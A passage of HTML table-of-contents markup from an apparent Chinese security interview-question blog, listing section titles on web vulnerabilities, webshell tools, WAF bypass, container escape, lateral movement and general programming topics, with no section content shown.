href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F%E5%92%8C%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F"><span class="toc-number">7.</span> <span class="toc-text">浏览器解析顺序和解码顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4limit%E5%90%8E%E7%9A%84%E9%80%97%E5%8F%B7%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">过滤limit后的逗号如何绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">9.</span> <span class="toc-text">过滤逗号的SQL注入如何绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%88SSTI%E5%8E%9F%E7%90%86%EF%BC%8C%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%8Cpayload%E7%9B%B8%E5%85%B3%E7%9A%84%E4%B8%9C%E8%A5%BF%EF%BC%89"><span class="toc-number">10.</span> <span class="toc-text">Python相关的漏洞（SSTI原理，利用过程，payload相关的东西）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">11.</span> <span class="toc-text">Java 内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E%E3%80%81%E5%93%A5%E6%96%AF%E6%8B%89%E5%B7%A5%E5%85%B7"><span class="toc-number">12.</span> <span class="toc-text">冰蝎、哥斯拉工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A1%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BC%95%E6%93%8E%E7%9A%84%E6%AD%A5%E9%AA%A4%E5%92%8C%E6%80%9D%E8%B7%AF"><span class="toc-number">13.</span> <span class="toc-text">审表达式引擎的步骤和思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E5%88%86%E6%9E%90"><span class="toc-number">14.</span> <span class="toc-text">XXE漏洞成因及代码层面分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%87%E5%88%B0ORDER-BY%E6%97%B6%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">15.</span> <span class="toc-text">遇到ORDER BY时的防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">16.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E8%BD%AC%E4%B9%89%E6%97%B6%E7%9A%84%E5%A4%84%E7%90%86"><span class="toc-number">17.</span> <span class="toc-text">特殊字符转义时的处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%BF%AE%E5%A4%8D%E5%9C%A8Docker%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">18.</span> <span class="toc-text">基于黑白名单的修复在Docker环境中的应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%B5%81%E7%A8%8B"><span class="toc-number">19.</span> <span class="toc-text">Java系统代码审计流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%B3%BB%E7%BB%9F%E4%B8%ADSQL%E6%B3%A8%E5%85%A5%E7%9A%84%E9%98%B2%E5%BE%A1%E4%B8%8E%E4%BF%AE%E5%A4%8D"><span class="toc-number">20.</span> <span class="toc-text">Java系统中SQL注入的防御与修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">20.1.</span> <span class="toc-text">防御措施</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-number">20.2.</span> <span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%B6%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%85%A5%E6%89%8B%E7%82%B9"><span class="toc-number">21.</span> <span class="toc-text">反序列化时的魔术方法入手点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8PHP%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8SSRF"><span class="toc-number">22.</span> <span class="toc-text">在PHP环境下利用SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%BB%A3%E7%A0%81%E5%B8%B8%E8%A7%81%E5%85%A5%E5%8F%A3%E5%87%BD%E6%95%B0%E7%9A%84%E6%9F%A5%E6%89%BE"><span class="toc-number">23.</span> <span class="toc-text">PHP代码常见入口函数的查找</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E7%9A%84URL%E8%B7%AF%E7%94%B1%E6%96%B9%E6%B3%95"><span class="toc-number">24.</span> <span class="toc-text">PHP开发框架的URL路由方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%B6%89%E5%8F%8A%E7%9A%84PHP%E8%AE%BE%E7%BD%AE"><span class="toc-number">25.</span> <span class="toc-text">远程文件包含和本地文件包含涉及的PHP设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84PHP%E9%85%8D%E7%BD%AE%E9%99%90%E5%88%B6"><span class="toc-number">26.</span> <span class="toc-text">本地文件包含的PHP配置限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%9C%A8%E5%81%9ASQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%97%B6%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">27.</span> <span class="toc-text">PHP在做SQL注入防御时的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E8%A7%A3%E5%86%B3%E4%BA%86%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%EF%BC%9F"><span class="toc-number">28.</span> <span class="toc-text">Redis解决了什么问题？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%AD%E7%82%B9%E6%95%B0%E6%8D%AE%E6%80%8E%E4%B9%88%E4%BF%9D%E8%AF%81Redis%E5%92%8CDB%E4%B8%AD%E7%9A%84%E4%B8%80%E8%87%B4%EF%BC%9F"><span class="toc-number">29.</span> <span class="toc-text">热点数据怎么保证Redis和DB中的一致？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E6%98%AF%E6%80%8E%E4%B9%88%E5%81%9A%E7%9A%84%EF%BC%9F"><span class="toc-number">30.</span> <span class="toc-text">用户登录认证是怎么做的？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%8E%E4%B9%88%E4%BF%9D%E6%8A%A4%EF%BC%9F"><span class="toc-number">31.</span> <span class="toc-text">Token的安全怎么保护？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E7%9A%84%E5%86%85%E5%AE%B9%E8%AF%A5%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%EF%BC%9F"><span class="toc-number">32.</span> <span class="toc-text">Token的内容该如何设计？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E4%BF%9D%E8%AF%81%E6%95%B0%E6%8D%AE%E4%B8%8D%E8%A2%AB%E7%AF%A1%E6%94%B9%E5%91%A2%EF%BC%9F"><span class="toc-number">33.</span> <span class="toc-text">怎么保证数据不被篡改呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8CCSRF%E9%98%B2%E5%BE%A1%EF%BC%9F"><span class="toc-number">34.</span> <span class="toc-text">如何进行CSRF防御？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%A1%E9%AA%8C%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">35.</span> <span class="toc-text">校验什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%8A%A0%E5%AF%86%EF%BC%9F"><span class="toc-number">36.</span> <span class="toc-text">Token为什么需要加密？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E6%B2%A1%E6%9C%89%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E8%BF%87%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7"><span class="toc-number">37.</span> <span class="toc-text">有没有自己动手写过一些工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%8E%A2%E6%B5%8B%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8F%82%E6%95%B0%E6%98%AF%E4%BB%80%E4%B9%88-%E2%80%94-%E5%A4%A7%E5%86%99%E8%BF%98%E6%98%AF%E5%B0%8F%E5%86%99"><span class="toc-number">38.</span> <span class="toc-text">nmap探测系统的参数是什么 —&gt;大写还是小写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E7%9A%84%E5%B0%8F%E5%86%99o%E4%B8%8Ea%E6%98%AF%E5%B9%B2%E5%98%9B%E7%9A%84"><span class="toc-number">39.</span> <span class="toc-text">nmap的小写o与a是干嘛的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%B2%E7%BC%96%E7%A0%81%E5%A6%82%E4%BD%95%E7%A1%AE%E8%AE%A4%E6%98%AFbase64"><span class="toc-number">40.</span> <span class="toc-text">一串编码如何确认是base64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">41.</span> <span class="toc-text">栅栏密码的原理是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E4%B8%8Emd5%E5%A6%82%E4%BD%95%E5%8C%BA%E5%88%AB"><span class="toc-number">42.</span> <span class="toc-text">base64与md5如何区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#oracle%E7%9A%84%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3%E6%98%AF%E5%A4%9A%E5%B0%91"><span class="toc-number">43.</span> <span class="toc-text">oracle的默认端口是多少</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E7%9A%84%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E4%B8%80%E8%88%AC%E6%94%BE%E5%88%B0%E5%93%AA"><span class="toc-number">44.</span> <span class="toc-text">mysql的管理员密码一般放到哪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9Csubstr-%E5%87%BD%E6%95%B0%E8%A2%AB%E7%A6%81%E7%94%A8%EF%BC%8C%E4%BD%A0%E8%84%91%E5%AD%90%E9%87%8C%E6%9C%89%E5%A4%9A%E5%B0%91%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0"><span class="toc-number">45.</span> <span class="toc-text">如果substr()函数被禁用，你脑子里有多少替换函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E5%A6%82%E4%BD%95%E6%8B%BF%E4%B8%8B%EF%BC%8C%E5%93%AA%E4%B8%AA%E7%AB%AF%E5%8F%A3%EF%BC%8C%E5%85%B7%E4%BD%93%E8%AF%AD%E5%8F%A5%EF%BC%8C%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C"><span class="toc-number">46.</span> <span class="toc-text">redis如何拿下，哪个端口，具体语句，具体操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E9%82%AE%E7%AE%B1%E7%9F%A5%E9%81%93%E5%AF%B9%E6%96%B9%E7%9A%84IP"><span class="toc-number">47.</span> <span class="toc-text">如何通过邮箱知道对方的IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struct2%E6%BC%8F%E6%B4%9E"><span class="toc-number">48.</span> <span class="toc-text">Struct2漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%E7%9A%84%E4%BB%8B%E7%BB%8D"><span class="toc-number">49.</span> <span class="toc-text">父子进程的介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B"><span class="toc-number">50.</span> <span class="toc-text">孤儿进程和僵尸进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">51.</span> <span class="toc-text">反弹shell的几种方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">52.</span> <span class="toc-text">Linux开机自启动方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#init-d%E8%84%9A%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-number">53.</span> <span class="toc-text">init.d脚本介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E8%B0%83%E7%94%A8%E4%BA%86%E5%93%AA%E4%BA%9B%E6%96%87%E4%BB%B6"><span class="toc-number">54.</span> <span class="toc-text">Linux怎么查看程序调用了哪些文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%9B%91%E6%8E%A7Linux%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">55.</span> <span class="toc-text">如何监控Linux文件操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%9C%89%E5%93%AA%E4%BA%9B%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">56.</span> <span class="toc-text">Linux有哪些系统调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BLinux%E5%BC%80%E6%94%BE%E7%9A%84%E7%BD%91%E7%BB%9C%E7%AB%AF%E5%8F%A3"><span class="toc-number">57.</span> <span class="toc-text">查看Linux开放的网络端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BLinux%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81"><span class="toc-number">58.</span> <span class="toc-text">查看Linux多线程状态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E4%B8%8B%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-number">59.</span> <span class="toc-text">Linux下隐藏文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86"><span class="toc-number">60.</span> <span class="toc-text">子域名收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-number">61.</span> <span class="toc-text">DNS重绑定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">62.</span> <span class="toc-text">DNS解析的流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC%E6%B5%81%E9%87%8F"><span class="toc-number">63.</span> <span class="toc-text">CC流量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E9%9A%A7%E9%81%93"><span class="toc-number">64.</span> <span class="toc-text">SSH隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86"><span class="toc-number">65.</span> <span class="toc-text">runc容器逃逸原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81WAF%E7%A7%8D%E7%B1%BB"><span class="toc-number">66.</span> <span class="toc-text">常见WAF种类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E7%9A%84UAF"><span class="toc-number">67.</span> <span class="toc-text">MySQL的UAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86"><span class="toc-number">68.</span> <span class="toc-text">Java 内存马原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E6%9D%80Java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">69.</span> <span class="toc-text">如何查杀Java内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E%E5%8E%9F%E7%90%86"><span class="toc-number">70.</span> <span class="toc-text">冰蝎原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%E5%8E%9F%E7%90%86"><span class="toc-number">71.</span> <span class="toc-text">哥斯拉原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A2%E9%BB%91%E6%A0%91%E5%8E%9F%E7%90%86"><span class="toc-number">72.</span> <span class="toc-text">红黑树原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%9A%84HashMap%E7%94%A8%E5%88%B0%E7%BA%A2%E9%BB%91%E6%A0%91"><span class="toc-number">73.</span> <span class="toc-text">Java的HashMap用到红黑树</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E7%9A%84%E7%B4%A2%E5%BC%95%E4%B8%8E%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84"><span class="toc-number">74.</span> <span class="toc-text">MySQL的索引与存储结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%A8B-%E6%A0%91"><span class="toc-number">75.</span> <span class="toc-text">MySQL为什么要用B+树</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E7%A4%BA%E4%BE%8B"><span class="toc-number">76.</span> <span class="toc-text">Python沙箱逃逸的原理与示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">76.1.</span> <span class="toc-text">沙箱逃逸的原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%A4%BA%E4%BE%8B"><span class="toc-number">76.2.</span> <span class="toc-text">沙箱逃逸示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8%E7%A4%BA%E4%BE%8B"><span class="toc-number">76.3.</span> <span class="toc-text">栈帧逃逸示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%83%E9%80%B8%E7%9A%84%E9%98%B2%E8%8C%83"><span class="toc-number">76.4.</span> <span class="toc-text">逃逸的防范</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RASP%E7%9A%84%E6%A6%82%E5%BF%B5%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-number">77.</span> <span class="toc-text">RASP的概念和原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RASP%E7%9A%84%E5%AF%B9%E6%8A%97"><span class="toc-number">78.</span> <span class="toc-text">RASP的对抗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%92%8CGolang%E8%AF%AD%E8%A8%80%E6%9C%AC%E8%BA%AB%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">79.</span> <span class="toc-text">PHP和Golang语言本身的安全问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">79.1.</span> <span class="toc-text">PHP的安全问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Golang%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">79.2.</span> <span class="toc-text">Golang的安全问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">80.</span> <span class="toc-text">Flask 模板注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">81.</span> <span class="toc-text">IIS文件解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">82.</span> <span class="toc-text">Apache文件解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">83.</span> <span class="toc-text">Nginx文件解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4"><span class="toc-number">84.</span> <span class="toc-text">nmap常见命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4"><span class="toc-number">85.</span> <span class="toc-text">sqlmap常见命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E4%B8%ADfinal%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%E7%94%A8%E9%80%94"><span class="toc-number">86.</span> <span class="toc-text">Java中final关键字的用途</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E4%B8%ADstatic%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%E7%94%A8%E9%80%94"><span class="toc-number">87.</span> <span class="toc-text">Java中static关键字的用途</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#final%E5%92%8Cstatic%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">88.</span> <span class="toc-text">final和static的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">89.</span> <span class="toc-text">WAF绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91WAF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">90.</span> <span class="toc-text">云WAF绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">91.</span> <span class="toc-text">Fastjson反序列化与Java反序列化的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson%E9%AB%98%E7%89%88%E6%9C%AC%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">92.</span> <span class="toc-text">Fastjson高版本攻击方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">93.</span> <span class="toc-text">Fastjson不出网的攻击方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">94.</span> <span class="toc-text">Fastjson常见利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%A8%AA%E5%90%91%E6%89%8B%E6%AE%B5"><span class="toc-number">95.</span> <span class="toc-text">内网渗透横向手段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-IPC-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">95.1.</span> <span class="toc-text">1. IPC$横向移动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-WMI%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">95.2.</span> <span class="toc-text">2. WMI横向移动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-SMB%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">95.3.</span> <span class="toc-text">3. SMB横向移动</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E7%9B%B8%E5%85%B3%EF%BC%9A%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%98%AF%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">96.</span> <span class="toc-text">免杀相关：判断是否是虚拟机环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E5%8E%9F%E7%94%9F%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E4%BB%A5%E5%8F%8A%E6%89%8B%E6%AE%B5"><span class="toc-number">97.</span> <span class="toc-text">云原生攻防思路以及手段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF"><span class="toc-number">97.1.</span> <span class="toc-text">攻防思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5"><span class="toc-number">97.2.</span> <span class="toc-text">常见攻击手段</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker%E9%80%83%E9%80%B8%E7%9A%84%E6%89%8B%E6%AE%B5"><span class="toc-number">98.</span> <span class="toc-text">Docker逃逸的手段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">98.1.</span> <span class="toc-text">1. 利用内核漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8Docker%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E"><span class="toc-number">98.2.</span> <span class="toc-text">2. 利用Docker版本漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8CDK%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7"><span class="toc-number">98.3.</span> <span class="toc-text">3. 利用CDK自动化工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8%E6%8C%82%E8%BD%BD%E7%82%B9"><span class="toc-number">98.4.</span> <span class="toc-text">4. 利用挂载点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struts2-OGNL-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">99.</span> <span class="toc-text">Struts2 OGNL 注入漏洞：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 